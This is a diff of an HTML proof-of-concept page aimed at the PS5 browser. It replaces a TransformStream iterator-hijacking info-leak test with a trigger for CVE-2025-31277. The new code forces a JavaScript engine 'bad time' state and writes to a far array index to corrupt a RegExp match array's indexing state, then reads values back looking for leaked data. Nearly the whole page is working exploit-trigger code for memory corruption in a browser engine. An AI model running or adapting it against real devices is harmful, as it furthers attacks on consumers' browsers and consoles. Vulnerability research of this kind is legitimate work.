@@ -1,74 +1,45 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 TransformStream Info Leak Test</title>
+<title>PS5 CVE-2025-31277 Test</title>
 </head>
 <body>
 <pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
 <script>
 const L = s => { document.getElementById('log').textContent += s + '\n'; };
+L("[*] Starting CVE-2025-31277 RegExp Array State Test...");
 
-L("[*] Starting TransformStream Info Leak test...");
-
-const originalIterator = Array.prototype[Symbol.iterator];
-let buf = new ArrayBuffer(64); // Native ArrayBuffer
-
-// We hijack the iterator. When TransformStream is created, it iterates internally.
-// We return a fake object. We try to make it look like a Strategy object to avoid crash.
-Array.prototype[Symbol.iterator] = function() {
-    const arr = this;
-    let i = 0;
-    return {
-        next() {
-            if (i >= arr.length)
-                return { done: true };
-            let val = arr[i];
-            // Substitute the 2nd and 3rd elements with fake strategy objects
-            if (arr.length === 3 && i >= 1) {
-                // Fake object. We put the ArrayBuffer as highWaterMark.
-                val = { 
-                    highWaterMark: 0, 
-                    size: function() { return 1; },
-                    ptr: buf 
-                };
-            }
-            i++;
-            return { value: val, done: false };
-        }
-    };
-};
-
-let stream;
-let leakedData = "No leak";
-
-try {
-    L("[*] Creating TransformStream with hijacked iterator...");
-    stream = new TransformStream();
-    L("[+] TransformStream created without immediate crash!");
-    
-    // If it doesn't crash, try to read properties that might have been confused
-    L("[*] Attempting to read stream properties (looking for leaked pointers)...");
-    
-    // Try to access internal properties that might have been overwritten by the confusion
-    let readable = stream.readable;
-    L("[*] Readable stream obtained.");
-    
-    // Check if highWaterMark was corrupted or leaked
-    // This is a guess, we need to see if we can read something unusual
-    let controller = stream.transformer;
-    L("[*] Transformer: " + controller);
-    
-} catch (e) {
-    L("[!] Exception caught: " + e.message);
-    L("[*] If the browser is still alive, check the log above for any weird values.");
-} finally {
-    // Restore iterator so we can interact with the page if it survives
-    Array.prototype[Symbol.iterator] = originalIterator;
+// This PoC forces a global "havingABadTime" state and then creates a RegExp match array.
+// The old code creates it as Contiguous, then writing to a large index corrupts the indexing state.
+function F0(){
+    class C4{}
+    function f5(a6,a7,a8){
+        return {__proto__:a7}
+    }
+    f5(C4,C4)
+    Object.defineProperty(C4, 8, {configurable:true, get: f5, set: f5})
 }
 
-L("[*] Test finished. If it crashed, note the last line seen.");
+L("[*] Running 5 iterations to trigger bad-time state confusion...");
+for(let v11=0;v11<5;v11++){
+    let v14 = ("size").match(/e/g);
+    new F0()
+    // This write forces the array to transition storage type with a corrupted state
+    v14[41530] = v14;
+    L("[+] Iteration " + (v11+1) + " completed.");
+    
+    // Try to read back to see if we get corrupted data or a crash
+    try {
+        let readVal = v14[0];
+        L("  Read v14[0]: " + readVal);
+    } catch (e) {
+        L("  Read error: " + e.message);
+    }
+}
+
+L("[*] If it didn't crash, the array state might be corrupted.");
+L("[*] If you see weird values above, that's an Info Leak!");
 </script>
 </body>
 </html>
